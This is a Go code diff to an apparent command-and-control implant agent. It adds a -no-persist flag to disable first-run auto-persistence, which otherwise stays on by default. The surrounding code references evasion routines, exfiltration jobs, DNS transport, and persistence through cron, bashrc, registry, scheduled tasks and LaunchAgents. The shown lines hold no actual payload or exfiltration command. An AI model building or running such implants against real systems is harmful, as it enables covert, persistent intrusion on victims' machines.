@@ -78,6 +78,11 @@ type Agent struct {
 	// Optional DNS transport domain (opt-in via -dns-domain)
 	dnsDomain string
 
+	// autoPersist controls first-run auto-persistence. It defaults to true
+	// but lab operators should disable it via -no-persist: authorized
+	// test benches rarely want the implant reinstalling itself on reboot.
+	autoPersist bool
+
 	// Channels
 	tasks   chan *proto.Task
 	results chan *proto.TaskResult
@@ -99,6 +104,7 @@ func New(serverAddr string) *Agent {
 		modules:        NewModuleRegistry(),
 		dynModules:     make(map[string]*DynamicModule),
 		exfilJobs:      make(map[string]*exfilJob),
+		autoPersist:    true,
 		tasks:          make(chan *proto.Task, 256),
 		results:        make(chan *proto.TaskResult, 256),
 	}
@@ -107,6 +113,12 @@ func New(serverAddr string) *Agent {
 // SetDNSDomain enables the DNS transport fallback for the given domain.
 // The server must be listening with the same domain in transport.dns_domains.
 func (a *Agent) SetDNSDomain(domain string) { a.dnsDomain = domain }
+
+// SetAutoPersist enables or disables first-run auto-persistence. It is wired
+// to the -no-persist CLI flag: authorized lab runs should disable it so the
+// implant does not reinstall itself (cron/bashrc on Linux, registry/schtasks
+// on Windows, LaunchAgent on macOS) behind the operator's back.
+func (a *Agent) SetAutoPersist(enabled bool) { a.autoPersist = enabled }
 
 // Run starts the agent main loop with reconnection.
 func (a *Agent) Run() error {
@@ -118,10 +130,12 @@ func (a *Agent) Run() error {
 	log.Printf("[AGENT] Initializing evasion techniques...")
 	evasion.Init()
 
-	// Auto-persist on first run (if not already persisted)
-	if !a.isPersisted() {
-		log.Printf("[AGENT] First run — establishing persistence")
-		a.autoPersist()
+	// Auto-persist on first run, unless disabled with -no-persist.
+	if a.autoPersist && !a.isPersisted() {
+		log.Printf("[AGENT] First run — establishing persistence (disable with -no-persist)")
+		a.persist()
+	} else if !a.autoPersist {
+		log.Printf("[AGENT] Auto-persistence disabled (-no-persist)")
 	}
 
 	for a.running {
@@ -1637,8 +1651,8 @@ func (a *Agent) isPersisted() bool {
 	return false
 }
 
-// autoPersist establishes persistence using the best method for the OS.
-func (a *Agent) autoPersist() {
+// persist establishes persistence using the best method for the OS.
+func (a *Agent) persist() {
 	exePath, _ := os.Executable()
 	serverAddr := a.serverAddr
 
@@ -1749,5 +1763,3 @@ func searchStr(s, substr string) bool {
 	}
 	return false
 }
-
-var _ = fmt.Sprintf
